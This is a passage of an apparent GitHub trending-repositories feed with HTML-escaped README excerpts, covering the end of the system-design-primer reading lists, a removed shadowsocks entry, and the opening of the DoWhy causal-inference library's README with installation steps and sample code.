href=&#34;http://highscalability.com/blog/2012/2/13/tumblr-architecture-15-billion-page-views-a-month-and-harder.html&#34;&gt;15 billion page views a month&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Twitter&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/scaling-twitter-making-twitter-10000-percent-faster&#34;&gt;Making Twitter 10000 percent faster&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2011/12/19/how-twitter-stores-250-million-tweets-a-day-using-mysql.html&#34;&gt;Storing 250 million tweets a day using MySQL&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2013/7/8/the-architecture-twitter-uses-to-deal-with-150m-active-users.html&#34;&gt;150M active users, 300K QPS, a 22 MB/S firehose&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.infoq.com/presentations/Twitter-Timeline-Scalability&#34;&gt;Timelines at scale&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=5cKTP36HVgI&#34;&gt;Big and small data at Twitter&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=z8LU0Cj6BOU&#34;&gt;Operations at Twitter: scaling beyond 100 million users&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2016/4/20/how-twitter-handles-3000-images-per-second.html&#34;&gt;How Twitter Handles 3,000 Images Per Second&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Uber&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2015/9/14/how-uber-scales-their-real-time-market-platform.html&#34;&gt;How Uber scales their real-time market platform&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/blog/2016/10/12/lessons-learned-from-scaling-uber-to-2000-engineers-1000-ser.html&#34;&gt;Lessons Learned From Scaling Uber To 2000 Engineers, 1000 Services, And 8000 Git Repositories&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;WhatsApp&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://highscalability.com/blog/2014/2/26/the-whatsapp-architecture-facebook-bought-for-19-billion.html&#34;&gt;The WhatsApp architecture Facebook bought for $19 billion&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;YouTube&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=w5WVu624fY8&#34;&gt;YouTube scalability&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://highscalability.com/youtube-architecture&#34;&gt;YouTube architecture&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Company engineering blogs&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Architectures for companies you are interviewing with.&lt;/p&gt; &#xA; &lt;p&gt;Questions you encounter might be from the same domain.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://nerds.airbnb.com/&#34;&gt;Airbnb Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer.atlassian.com/blog/&#34;&gt;Atlassian Developers&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://aws.amazon.com/blogs/aws/&#34;&gt;AWS Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://word.bitly.com/&#34;&gt;Bitly Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.box.com/blog/category/engineering&#34;&gt;Box Blogs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.cloudera.com/&#34;&gt;Cloudera Developer Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tech.dropbox.com/&#34;&gt;Dropbox Tech Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.quora.com/q/quoraengineering&#34;&gt;Engineering at Quora&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.ebaytechblog.com/&#34;&gt;Ebay Tech Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.evernote.com/tech/&#34;&gt;Evernote Tech Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://codeascraft.com/&#34;&gt;Etsy Code as Craft&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.facebook.com/Engineering&#34;&gt;Facebook Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://code.flickr.net/&#34;&gt;Flickr Code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://engineering.foursquare.com/&#34;&gt;Foursquare Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.blog/category/engineering&#34;&gt;GitHub Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://googleresearch.blogspot.com/&#34;&gt;Google Research Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://engineering.groupon.com/&#34;&gt;Groupon Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://engineering.heroku.com/&#34;&gt;Heroku Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://product.hubspot.com/blog/topic/engineering&#34;&gt;Hubspot Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://highscalability.com/&#34;&gt;High Scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://instagram-engineering.tumblr.com/&#34;&gt;Instagram Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://software.intel.com/en-us/blogs/&#34;&gt;Intel Software Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blogs.janestreet.com/category/ocaml/&#34;&gt;Jane Street Tech Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://engineering.linkedin.com/blog&#34;&gt;LinkedIn Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://engineering.microsoft.com/&#34;&gt;Microsoft Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blogs.msdn.microsoft.com/pythonengineering/&#34;&gt;Microsoft Python Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://techblog.netflix.com/&#34;&gt;Netflix Tech Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/paypal-engineering&#34;&gt;Paypal Developer Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@Pinterest_Engineering&#34;&gt;Pinterest Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.redditblog.com/&#34;&gt;Reddit Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer.salesforce.com/blogs/engineering/&#34;&gt;Salesforce Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://slack.engineering/&#34;&gt;Slack Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.spotify.com/&#34;&gt;Spotify Labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.twilio.com/engineering&#34;&gt;Twilio Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.twitter.com/engineering/&#34;&gt;Twitter Engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://eng.uber.com/&#34;&gt;Uber Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://yahooeng.tumblr.com/&#34;&gt;Yahoo Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://engineeringblog.yelp.com/&#34;&gt;Yelp Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zynga.com/blogs/engineering&#34;&gt;Zynga Engineering Blog&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Source(s) and further reading&lt;/h4&gt; &#xA;&lt;p&gt;Looking to add a blog? To avoid duplicating work, consider adding your company blog to the following repo:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kilimchoi/engineering-blogs&#34;&gt;kilimchoi/engineering-blogs&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Under development&lt;/h2&gt; &#xA;&lt;p&gt;Interested in adding a section or helping complete one in-progress? &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Distributed computing with MapReduce&lt;/li&gt; &#xA; &lt;li&gt;Consistent hashing&lt;/li&gt; &#xA; &lt;li&gt;Scatter gather&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contribute&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;p&gt;Credits and sources are provided throughout this repo.&lt;/p&gt; &#xA;&lt;p&gt;Special thanks to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.hiredintech.com/system-design/the-system-design-process/&#34;&gt;Hired in tech&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.amazon.com/dp/0984782850/&#34;&gt;Cracking the coding interview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://highscalability.com/&#34;&gt;High scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/checkcheckzz/system-design-interview&#34;&gt;checkcheckzz/system-design-interview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/shashank88/system_design&#34;&gt;shashank88/system_design&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mmcgrana/services-engineering&#34;&gt;mmcgrana/services-engineering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/vasanthk/485d1c25737e8e72759f&#34;&gt;System design cheat sheet&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://dancres.github.io/Pages/&#34;&gt;A distributed systems reading list&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview&#34;&gt;Cracking the system design interview&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contact info&lt;/h2&gt; &#xA;&lt;p&gt;Feel free to contact me to discuss any issues, questions, or comments.&lt;/p&gt; &#xA;&lt;p&gt;My contact info can be found on my &lt;a href=&#34;https://github.com/donnemartin&#34;&gt;GitHub page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;I am providing code and resources in this repository to you under an open source license. Because this is my personal repository, the license you receive to my code and resources is from me and not my employer (Facebook).&lt;/em&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Copyright 2017 Donne Martin&#xA;&#xA;Creative Commons Attribution 4.0 International License (CC BY 4.0)&#xA;&#xA;http://creativecommons.org/licenses/by/4.0/&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>shadowsocks/shadowsocks</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/shadowsocks/shadowsocks</id>
    <link href="https://github.com/shadowsocks/shadowsocks" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Removed according to regulations.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>py-why/dowhy</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/py-why/dowhy</id>
    <link href="https://github.com/py-why/dowhy" rel="alternate"></link>
    <summary type="html">&lt;p&gt;DoWhy is a Python library for causal inference that supports explicit modeling and testing of causal assumptions. DoWhy is based on a unified language for causal inference, combining causal graphical models and potential outcomes frameworks.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;|BuildStatus|_ |PyPiVersion|_ |PythonSupport|_ |Downloads|_&lt;/p&gt; &#xA;&lt;p&gt;.. |PyPiVersion| image:: &lt;a href=&#34;https://img.shields.io/pypi/v/dowhy.svg&#34;&gt;https://img.shields.io/pypi/v/dowhy.svg&lt;/a&gt; .. _PyPiVersion: &lt;a href=&#34;https://pypi.org/project/dowhy/&#34;&gt;https://pypi.org/project/dowhy/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;.. |PythonSupport| image:: &lt;a href=&#34;https://img.shields.io/pypi/pyversions/dowhy.svg&#34;&gt;https://img.shields.io/pypi/pyversions/dowhy.svg&lt;/a&gt; .. _PythonSupport: &lt;a href=&#34;https://pypi.org/project/dowhy/&#34;&gt;https://pypi.org/project/dowhy/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;.. |BuildStatus| image:: &lt;a href=&#34;https://github.com/microsoft/dowhy/workflows/Python%20package/badge.svg&#34;&gt;https://github.com/microsoft/dowhy/workflows/Python%20package/badge.svg&lt;/a&gt; .. _BuildStatus: &lt;a href=&#34;https://github.com/microsoft/dowhy/actions&#34;&gt;https://github.com/microsoft/dowhy/actions&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;.. |Downloads| image:: &lt;a href=&#34;https://pepy.tech/badge/dowhy&#34;&gt;https://pepy.tech/badge/dowhy&lt;/a&gt; .. _Downloads: &lt;a href=&#34;https://pepy.tech/project/dowhy&#34;&gt;https://pepy.tech/project/dowhy&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;DoWhy | An end-to-end library for causal inference&lt;/h1&gt; &#xA;&lt;p&gt;Introducing DoWhy and the 4 steps of causal inference | &lt;code&gt;Microsoft Research Blog &amp;lt;https://www.microsoft.com/en-us/research/blog/dowhy-a-library-for-causal-inference/&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Video Tutorial &amp;lt;https://note.microsoft.com/MSR-Webinar-DoWhy-Library-Registration-On-Demand.html&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Arxiv Paper &amp;lt;https://arxiv.org/abs/2011.04216&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Slides &amp;lt;https://www2.slideshare.net/AmitSharma315/dowhy-an-endtoend-library-for-causal-inference&amp;gt;&lt;/code&gt;_&lt;/p&gt; &#xA;&lt;p&gt;Read the &lt;code&gt;docs &amp;lt;https://py-why.github.io/dowhy/&amp;gt;&lt;/code&gt;_ | Try it online! |Binder|_&lt;/p&gt; &#xA;&lt;p&gt;.. |Binder| image:: &lt;a href=&#34;https://mybinder.org/badge_logo.svg&#34;&gt;https://mybinder.org/badge_logo.svg&lt;/a&gt; .. _Binder: &lt;a href=&#34;https://mybinder.org/v2/gh/microsoft/dowhy/master?filepath=docs%2Fsource%2F&#34;&gt;https://mybinder.org/v2/gh/microsoft/dowhy/master?filepath=docs%2Fsource%2F&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Case Studies using DoWhy&lt;/strong&gt;: &lt;code&gt;Hotel booking cancellations &amp;lt;https://towardsdatascience.com/beyond-predictive-models-the-causal-story-behind-hotel-booking-cancellations-d29e8558cbaf&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Effect of customer loyalty programs &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_example_effect_of_memberrewards_program.ipynb&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Optimizing article headlines &amp;lt;https://medium.com/@akelleh/introducing-the-do-sampler-for-causal-inference-a3296ea9e78d&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Effect of home visits on infant health (IHDP) &amp;lt;https://towardsdatascience.com/implementing-causal-inference-a-key-step-towards-agi-de2cde8ea599&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Causes of customer churn/attrition &amp;lt;https://medium.com/geekculture/a-quickstart-for-causal-analysis-decision-making-with-dowhy-2ce2d4d1efa9&amp;gt;&lt;/code&gt;_&lt;/p&gt; &#xA;&lt;p&gt;.. image:: &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/dowhy-schematic.png&#34;&gt;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/dowhy-schematic.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;As computing systems are more frequently and more actively intervening in societally critical domains such as healthcare, education, and governance, it is critical to correctly predict and understand the causal effects of these interventions. Without an A/B test, conventional machine learning methods, built on pattern recognition and correlational analyses, are insufficient for decision-making.&lt;/p&gt; &#xA;&lt;p&gt;Much like machine learning libraries have done for prediction, &lt;strong&gt;&#34;DoWhy&#34; is a Python library that aims to spark causal thinking and analysis&lt;/strong&gt;. DoWhy provides a principled four-step interface for causal inference that focuses on explicitly modeling causal assumptions and validating them as much as possible. The key feature of DoWhy is its state-of-the-art refutation API that can automatically test causal assumptions for any estimation method, thus making inference more robust and accessible to non-experts. DoWhy supports estimation of the average causal effect for backdoor, frontdoor, instrumental variable and other identification methods, and estimation of the conditional effect (CATE) through an integration with the EconML library.&lt;/p&gt; &#xA;&lt;p&gt;For a quick introduction to causal inference, check out &lt;code&gt;amit-sharma/causal-inference-tutorial &amp;lt;https://github.com/amit-sharma/causal-inference-tutorial/&amp;gt;&lt;/code&gt;&lt;em&gt;. We also gave a more comprehensive tutorial at the ACM Knowledge Discovery and Data Mining (&lt;code&gt;KDD 2018 &amp;lt;http://www.kdd.org/kdd2018/&amp;gt;&lt;/code&gt;&lt;/em&gt;) conference: &lt;code&gt;causalinference.gitlab.io/kdd-tutorial &amp;lt;http://causalinference.gitlab.io/kdd-tutorial/&amp;gt;&lt;/code&gt;&lt;em&gt;. For an introduction to the four steps of causal inference and its implications for machine learning, you can access this video tutorial from Microsoft Research: &lt;code&gt;DoWhy Webinar &amp;lt;https://note.microsoft.com/MSR-Webinar-DoWhy-Library-Registration-On-Demand.html&amp;gt;&lt;/code&gt;&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Documentation for DoWhy is available at &lt;code&gt;py-why.github.io/dowhy &amp;lt;https://py-why.github.io/dowhy/&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;p&gt;.. i here comment toctree:: .. i here comment :maxdepth: 4 .. i here comment :caption: Contents: .. contents:: &lt;strong&gt;Contents&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;News&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;2022.05.27&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;DoWhy now part of PyWhy&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;We have moved DoWhy from microsoft/dowhy to py-why/dowhy. While GitHub will automatically redirect your git command for cloning, pulling, etc., we recommend updating git remotes and bookmarks. Please note that the &lt;strong&gt;documentation&lt;/strong&gt; has now moved to &lt;a href=&#34;https://py-why.github.io/dowhy&#34;&gt;https://py-why.github.io/dowhy&lt;/a&gt; with &lt;strong&gt;no&lt;/strong&gt; redirect from the old URL.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Experimental support for GCM-based inference&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;We have started adding support for graphical causal model-based inference (or in short GCM-based). At the moment, this includes support for interventions, counterfactuals, and attributing distribution changes. As part of this, we also added features for Shapley value estimation and independence tests. We&#39;re still in the process of fleshing everything out, including &lt;code&gt;documentation &amp;lt;https://py-why.github.io/dowhy/gcm/&amp;gt;&lt;/code&gt;&lt;em&gt;. Some of it is already on &lt;code&gt;master &amp;lt;https://github.com/py-why/dowhy&amp;gt;&lt;/code&gt;&lt;/em&gt;, other parts are on feature branches (prefixed with &lt;code&gt;gcm-&lt;/code&gt;) with open pull-requests, other parts will appear as new pull-requests in the next couple of weeks. Be sure to watch this space here as we quickly expand functionality and documentation.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;The need for causal inference&lt;/h2&gt; &#xA;&lt;p&gt;Predictive models uncover patterns that connect the inputs and outcome in observed data. To intervene, however, we need to estimate the effect of changing an input from its current value, for which no data exists. Such questions, involving estimating a &lt;em&gt;counterfactual&lt;/em&gt;, are common in decision-making scenarios.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Will it work? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Does a proposed change to a system improve people&#39;s outcomes?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Why did it work? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;What led to a change in a system&#39;s outcome?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;What should we do? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;What changes to a system are likely to improve outcomes for people?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;What are the overall effects? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;How does the system interact with human behavior?&lt;/li&gt; &#xA;   &lt;li&gt;What is the effect of a system&#39;s recommendations on people&#39;s activity?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Answering these questions requires causal reasoning. While many methods exist for causal inference, it is hard to compare their assumptions and robustness of results. DoWhy makes three contributions,&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Provides a principled way of modeling a given problem as a causal graph so that all assumptions are explicit.&lt;/li&gt; &#xA; &lt;li&gt;Provides a unified interface for many popular causal inference methods, combining the two major frameworks of graphical models and potential outcomes.&lt;/li&gt; &#xA; &lt;li&gt;Automatically tests for the validity of assumptions if possible and assesses the robustness of the estimate to violations.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;To see DoWhy in action, check out how it can be applied to estimate the effect of a subscription or rewards program for customers [&lt;code&gt;Rewards notebook &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_example_effect_of_memberrewards_program.ipynb&amp;gt;&lt;/code&gt;&lt;em&gt;] and for implementing and evaluating causal inference methods on benchmark datasets like the &lt;code&gt;Infant Health and Development Program (IHDP) &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_ihdp_data_example.ipynb&amp;gt;&lt;/code&gt;&lt;/em&gt; dataset, &lt;code&gt;Infant Mortality (Twins) &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_twins_example.ipynb&amp;gt;&lt;/code&gt;_ dataset, and the &lt;code&gt;Lalonde Jobs &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_lalonde_example.ipynb&amp;gt;&lt;/code&gt;_ dataset.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy support Python 3.6+. To install, you can use pip or conda.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Latest Release&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Install the latest &lt;code&gt;release &amp;lt;https://pypi.org/project/dowhy/&amp;gt;&lt;/code&gt;__ using pip.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;p&gt;pip install dowhy&lt;/p&gt; &#xA;&lt;p&gt;Install the latest &lt;code&gt;release &amp;lt;https://anaconda.org/conda-forge/dowhy&amp;gt;&lt;/code&gt;__ using conda.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;p&gt;conda install -c conda-forge dowhy&lt;/p&gt; &#xA;&lt;p&gt;If you face &#34;Solving environment&#34; problems with conda, then try :code:&lt;code&gt;conda update --all&lt;/code&gt; and then install dowhy. If that does not work, then use :code:&lt;code&gt;conda config --set channel_priority false&lt;/code&gt; and try to install again. If the problem persists, please add your issue &lt;code&gt;here &amp;lt;https://github.com/microsoft/dowhy/issues/197&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Development Version&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you prefer the latest dev version, clone this repository and run the following command from the top-most folder of the repository.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip install -e .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;DoWhy requires the following packages:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;numpy&lt;/li&gt; &#xA; &lt;li&gt;scipy&lt;/li&gt; &#xA; &lt;li&gt;scikit-learn&lt;/li&gt; &#xA; &lt;li&gt;pandas&lt;/li&gt; &#xA; &lt;li&gt;networkx (for analyzing causal graphs)&lt;/li&gt; &#xA; &lt;li&gt;matplotlib (for general plotting)&lt;/li&gt; &#xA; &lt;li&gt;sympy (for rendering symbolic expressions)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you face any problems, try installing dependencies manually.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Optionally, if you wish to input graphs in the dot format, then install pydot (or pygraphviz).&lt;/p&gt; &#xA;&lt;p&gt;For better-looking graphs, you can optionally install pygraphviz. To proceed, first install graphviz and then pygraphviz (on Ubuntu and Ubuntu WSL).&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo apt install graphviz libgraphviz-dev graphviz-dev pkg-config&#xA;## from https://github.com/pygraphviz/pygraphviz/issues/71&#xA;pip install pygraphviz --install-option=&#34;--include-path=/usr/include/graphviz&#34; \&#xA;--install-option=&#34;--library-path=/usr/lib/graphviz/&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Sample causal inference analysis in DoWhy&lt;/h2&gt; &#xA;&lt;p&gt;Most DoWhy analyses for causal inference take 4 lines to write, assuming a pandas dataframe df that contains the data:&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;from dowhy import CausalModel&#xA;import dowhy.datasets&#xA;&#xA;# Load some sample data&#xA;data = dowhy.datasets.linear_dataset(&#xA;    beta=10,&#xA;    num_common_causes=5,&#xA;    num_instruments=2,&#xA;    num_samples=10000,&#xA;    treatment_is_binary=True)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DoWhy supports two formats for providing the causal graph: &lt;code&gt;gml &amp;lt;https://github.com/GunterMueller/UNI_PASSAU_FMI_Graph_Drawing&amp;gt;&lt;/code&gt;_ (preferred) and &lt;code&gt;dot &amp;lt;http://www.graphviz.org/documentation/&amp;gt;&lt;/code&gt;_. After loading in the data, we use the four main operations in DoWhy: &lt;em&gt;model&lt;/em&gt;, &lt;em&gt;estimate&lt;/em&gt;, &lt;em&gt;identify&lt;/em&gt; and &lt;em&gt;refute&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# I. Create a causal model from the data and given graph.&#xA;model = CausalModel(&#xA;    data=data[&#34;df&#34;],&#xA;    treatment=data[&#34;treatment_name&#34;],&#xA;    outcome=data[&#34;outcome_name&#34;],&#xA;    graph=data[&#34;gml_graph&#34;])&#xA;&#xA;# II. Identify causal effect and return target estimands&#xA;identified_estimand = model.identify_effect()&#xA;&#xA;# III. Estimate 